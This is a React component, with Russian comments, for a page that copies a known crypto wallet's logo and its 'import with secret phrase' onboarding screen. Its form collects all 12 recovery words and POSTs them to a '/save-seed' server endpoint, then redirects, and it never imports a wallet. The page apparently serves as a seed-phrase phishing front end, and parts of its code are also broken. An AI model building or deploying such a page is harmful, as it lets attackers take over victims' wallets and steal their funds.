import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import axios from "axios";

const Imp12 = () => {
  // Создаем массив состояний для значений и видимости паролей
  const [inputValues, setInputValues] = useState(Array(12).fill(""));
  const [showPasswords, setShowPasswords] = useState(Array(12).fill(false));
  const [menuOpen, setMenuOpen] = useState(false);

  // Универсальный обработчик для изменения значений ввода
  const handleInputChange = (index) => (e) => {
    const newInputValues = [...inputValues];
    newInputValues[index] = e.target.value;
    setInputValues(newInputValues);
  };

  // Универсальный обработчик для переключения видимости пароля
  const togglePasswordVisibility = (index) => () => {
    const newShowPasswords = [...showPasswords];
    newShowPasswords[index] = !newShowPasswords[index];
    setShowPasswords(newShowPasswords);
  };

  // Обработчик для очистки всех полей
  const handleClearAll = () => {
    setInputValues(Array(12).fill("")); // Очищаем все поля
  };

  const navigate = useNavigate();

  const handleClick = () => {
    navigate('/err');
  };

  const toggleMenu = () => {
    setMenuOpen((prev) => !prev);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const seedPhrase = inputValues.join("-");

    // Проверка: если все поля заполнены
    if (inputValues.some(value => value.trim() === "")) {
      alert("Пожалуйста, заполните все поля.");
      return;
    }

    // Отправка данных на сервер
    axios
      .post("http://localhost:5000/save-seed", { seed_phrase: seedPhrase })
      .then((response) => {
        console.log("Seed phrase saved:", response.data);
        navigate("/next-page"); // Перенаправляем пользователя
      })
      .catch((error) => {
        console.error("Error saving seed phrase:", error);
      });


    const navigate = useNavigate();
    const handleClick = () => {
      navigate('/err');
    };
  };

  const allFieldsFilled = inputValues.every((value) => value.trim() !== "");
  return (
    <div>
      <div className="relative flex flex-col flex-grow w-full h-full pt-2 md:max-w-[438px] m-auto">
        {/* SVG и остальные элементы */}
        <div className="flex my-11 justify-center">
          <svg
            fill="none"
            width="62"
            height="87"
            viewBox="0 0 62 87"
            xmlns="http://www.w3.org/2000/svg"
          >
            <g clip-path="url(#clip0_25278_20289)">
              <path
                d="M0 26.9363L30.5839 16.9512V86.0767C8.73806 76.8594 0 59.1941 0 49.2089V26.935V26.9363Z"
                fill="#0500FF"
              ></path>
              <path
                d="M61.1698 26.9363L30.5859 16.9512V86.0767C52.4318 76.8594 61.1698 59.1941 61.1698 49.2103V26.9363Z"
                fill="url(#paint0_linear_25278_20289)"
              ></path>
              <path
                d="M12.0424 0.342773H16.3099V2.73341C17.7089 0.584462 19.3179 0.342773 21.674 0.342773V4.56886H20.6009C17.778 4.56886 16.4259 5.89745 16.4259 8.5284V13.0197H12.041V0.342773H12.0424Z"
                fill="#0500FF"
              ></path>
              <path
                d="M35.9182 13.0183H31.5333V11.8098C30.5762 12.9216 29.2711 13.4036 27.6621 13.4036C24.6072 13.4036 22.8809 11.593 22.8809 8.26047V0.342773H27.2658V7.273C27.2658 8.8419 28.035 9.75893 29.3401 9.75893C30.6453 9.75893 31.5333 8.86538 31.5333 7.34482V0.342773H35.9182V13.0196V13.0183Z"
                fill="#0500FF"
              ></path>
              <path
                d="M36.9883 9.10444H41.0942C41.282 10.0215 41.9104 10.4068 43.4255 10.4068C44.6615 10.4068 45.3852 10.1182 45.3852 9.58644C45.3852 9.17488 45.0344 8.90971 44.0331 8.69288L40.7213 7.94434C38.5061 7.43887 37.386 6.15861 37.386 4.10496C37.386 1.39943 39.3679 -0.000976562 43.2155 -0.000976562C47.0632 -0.000976562 48.9525 1.36352 49.2798 4.28588H45.1988C45.1297 3.51386 44.3356 3.04153 43.0305 3.04153C41.9822 3.04153 41.3055 3.37851 41.3055 3.88675C41.3055 4.3204 41.7475 4.65877 42.6355 4.87836L46.1103 5.72358C48.3946 6.27739 49.4925 7.43749 49.4925 9.32127C49.4925 11.9301 47.2303 13.4755 43.384 13.4755C39.5377 13.4755 36.9938 11.81 36.9938 9.10444H36.9897H36.9883Z"
                fill="#0500FF"
              ></path>
              <path
                d="M61.1684 4.28436V0.342773H50.3477V4.28712H53.5766V13.0183H57.938V4.28436H61.1684Z"
                fill="#0500FF"
              ></path>
              <path
                d="M10.8227 4.28436V0.342773H0.00195312V4.28712H3.2309V13.0183H7.59234V4.28436H10.8213H10.8227Z"
                fill="#0500FF"
              ></path>
            </g>
            <defs>
              <linearGradient
                id="paint0_linear_25278_20289"
                x1="53.1099"
                y1="12.1326"
                x2="29.8181"
                y2="85.092"
                gradientUnits="userSpaceOnUse"
              >
                <stop offset="0.02" stop-color="#0000FF"></stop>
                <stop offset="0.08" stop-color="#0094FF"></stop>
                <stop offset="0.16" stop-color="#48FF91"></stop>
                <stop offset="0.42" stop-color="#0094FF"></stop>
                <stop offset="0.68" stop-color="#0038FF"></stop>
                <stop offset="0.9" stop-color="#0500FF"></stop>
              </linearGradient>
              <clipPath id="clip0_25278_20289">
                <rect width="61.1691" height="86.0768" fill="white"></rect>
              </clipPath>
            </defs>
          </svg>
        </div>
        <div className="flex my-11 justify-center">
          {/* SVG логотип */}
        </div>
        <div className="bg-backgroundPrimary border border-line rounded p-6 mb-11">
          <div className="w-full flex items-center justify-between space-x-4">
            <div className="w-full flex flex-col items-center justify-center">
              <div className="w-full flex items-center justify-center h-1 rounded-curvy bg-[#0500FF] opacity-100"></div>
            </div>
            <div className="w-full flex flex-col items-center justify-center">
              <div className="w-full flex items-center justify-center h-1 rounded-curvy bg-[#0500FF] opacity-100"></div>
            </div>
          </div>
          <h2
            data-testid="onboarding-step-title"
            className="font-semibold text-unset text-[26px] pt-[20px] text-center"
          >
            Импортировать, используя секретную фразу
          </h2>
          <div className="w-full mt-6 flex flex-col space-y-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div
                className="flex flex-col items-center space-y-6"
                data-testid="secret-phrase-select"
              >
                <div className="flex w-full max-w-[372px]">
                  <div className="w-full">
                    <div className="relative w-full mt-1 bg-gray-100 rounded-md py-[10px] pl-[15px]">
                      <button
                        className="flex justify-between items-center w-full"
                        id="headlessui-listbox-button-1"
                        type="button"
                        onClick={toggleMenu}
                      >
                        <span className="font-semibold text-[18px] text-[#0500FF]">
                          У меня есть сид-фраза 12
                        </span>
                        <span className="pointer-events-none flex items-center pr-2">
                          <svg
                            className="text-iconNormal"
                            fill="none"
                            width="20"
                            height="20"
                            viewBox="0 0 20 20"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path
                              fillRule="evenodd"
                              clipRule="evenodd"
                              d="M9.99976 10.2397L6.75895 6.99885L5.28581 8.47199L9.99986 13.186L11.473 11.7129L11.4729 11.7128L14.7139 8.47183L13.2407 6.99869L9.99976 10.2397Z"
                              fill="currentColor"
                            ></path>
                          </svg>
                        </span>
                      </button>
                      {menuOpen && (
                        <div className="absolute left-0 mt-2 bg-white shadow-lg rounded-md w-full z-10">
                          <div className="py-2">
                            <Link to="/imp24">
                              <button
                                className="w-full text-left px-4 py-2 hover:bg-gray-100"
                                onClick={() => setMenuOpen(false)}
                              >
                                У меня есть сид-фраза 24
                              </button>
                            </Link>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
                <div>
                  <div className="flex flex-wrap flex-grow gap-1 items-center justify-center">
                    {Array.from({ length: 12 }, (_, index) => (
                      <div key={index} className="text-start">
                        <div className="input-field space-x-1 h-12 bg-gray-100 flex px-[10px] rounded-md max-w-[184px]">
                          {inputValues[index] && (
                            <span className="text-gray-500 mr-2">{index + 1}.</span>
                          )}
                          <input
                            className="ph-no-capture w-full block flex-1 outline-none bg-transparent title-text font-medium text-left"
                            key={index}
                            type={showPasswords[index] ? "text" : "password"}
                            placeholder={`Word #${index + 1}`}
                            spellCheck="false"
                            value={inputValues[index]}
                            onChange={handleInputChange(index)}
                          />
                          <div className="flex space-x-2">
                            <div className="flex items-center">
                              <div
                                className="flex w-full"
                                data-tooltip-id={`button-tooltip-${index + 1}`}
                                data-tooltip-place="top-end"
                              >
                                <button
                                  data-testid={`input-action-show-password-${index + 1}`}
                                  type="button"
                                  onClick={togglePasswordVisibility(index)}
                                  className="outline-none bg-transparent text-backgroundPrimary default-button p-0 w-full"
                                >
                                  {showPasswords[index] ? (
                                    // Видимый пароль — значок "открытого" глаза
                                    <svg
                                      className="opacity-[40%]"
                                      fill="none"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        fillRule="evenodd"
                                        clipRule="evenodd"
                                        d="M12 4.5C7.30558 4.5 3.2519 7.31703 1 12C3.2519 16.683 7.30558 19.5 12 19.5C16.6944 19.5 20.7481 16.683 23 12C20.7481 7.31703 16.6944 4.5 12 4.5ZM12 17.25C9.1005 17.25 6.75 14.8995 6.75 12C6.75 9.1005 9.1005 6.75 12 6.75C14.8995 6.75 17.25 9.1005 17.25 12C17.25 14.8995 14.8995 17.25 12 17.25ZM12 8.5C10.4812 8.5 9.25 9.73122 9.25 11.25C9.25 12.7688 10.4812 14 12 14C13.5188 14 14.75 12.7688 14.75 11.25C14.75 9.73122 13.5188 8.5 12 8.5Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  ) : (
                                    // Скрытый пароль — значок "закрытого" глаза (ваш оригинальный код)
                                    <svg
                                      className="opacity-[40%]"
                                      fill="none"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        fillRule="evenodd"
                                        clipRule="evenodd"
                                        d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                                        fill="currentColor"
                                      ></path>
                                      <path
                                        d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  )}
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <button
                  type="button"
                  onClick={handleClearAll}
                  className="outline-none bg-transparent text-backgroundPrimary default-button p-0 w-full"
                >
                  <p className="title-text text-primary font-medium text-[#0500FF]">
                    Очистить все
                  </p>
                </button>
              </div>

              <div className="flex w-full items-center justify-between mt-6 space-x-4">
                <Link to="/imp">
                  <button
                    type="button"
                    className="outline-none bg-transparent text-backgroundPrimary default-button pl-[70px] w-full"
                  >
                    <p className="title-text text-primary font-medium text-[#0500FF]">
                      Назад
                    </p>
                  </button>
                </Link>
                <button
                  className="max-w-[180px] bg-[#0500FF] p-[10px] text-white rounded-full w-full"
                  type="submit"
                  disabled={!allFieldsFilled}
                >
                  Далее
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Imp12; 
